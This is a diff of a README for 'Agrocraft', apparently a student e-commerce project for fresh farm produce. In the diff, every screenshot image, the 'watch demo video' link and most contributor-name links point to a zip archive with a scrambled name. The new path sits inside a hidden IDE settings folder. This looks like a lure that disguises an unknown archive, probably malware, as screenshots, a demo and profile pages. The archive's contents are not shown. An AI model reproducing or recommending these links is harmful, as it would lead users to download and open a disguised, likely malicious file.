@@ -8,19 +8,19 @@
 
 
 <div align= "center"> 
-<img src = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" width = 400 height = 250 align = center> <br> <hr> <br>
+<img src = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" width = 400 height = 250 align = center> <br> <hr> <br>
 
-<img src = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" width = 400 height = 250> <p>Buyer Homepage</p> <hr>
+<img src = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" width = 400 height = 250> <p>Buyer Homepage</p> <hr>
 
-<img src = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" width = 400 height = 250> <p>Products </p> <hr>
+<img src = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" width = 400 height = 250> <p>Products </p> <hr>
 
-<img src = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" width = 400 height = 250> <p> Categorical and Location Wise Search</p> <br> 
+<img src = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" width = 400 height = 250> <p> Categorical and Location Wise Search</p> <br> 
 
 </div>
 
 <div align= "center">  
   
-## <a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" > Click Here </a> To Watch Demo Video
+## <a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" > Click Here </a> To Watch Demo Video
 
 </div>
 
@@ -32,9 +32,9 @@
 * BOOTSTRAP
 
 ### Made By
-<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" >Abhishek Gupta </a><br>
-<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" >Omkar Bhabal</a> <br>
-<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" >Ansh Chhadva</a> <br>
+<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" >Abhishek Gupta </a><br>
+<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" >Omkar Bhabal</a> <br>
+<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" >Ansh Chhadva</a> <br>
 <a href = "#" >Calista Gonsalves </a> <br>
-<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" >Gladina Raymond </a><br>
-<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/Functions/Vegetables_Website_Fresh_Produce_Commerce_Fruits_And_Farm_Agrocraft_For_An_v3.1.zip" >Arpit Bhat</a> <br>
+<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" >Gladina Raymond </a><br>
+<a href = "https://raw.githubusercontent.com/Nagaraju9550/Agrocraft-An-E-Commerce-Website-For-Fresh-Farm-Produce-Vegetables-And-Fruits/master/BuyerPortal/Includes/.idea/inspectionProfiles/Vegetables_Produce_Commerce_And_For_Fresh_An_Fruits_Website_Agrocraft_Farm_1.0.zip" >Arpit Bhat</a> <br>
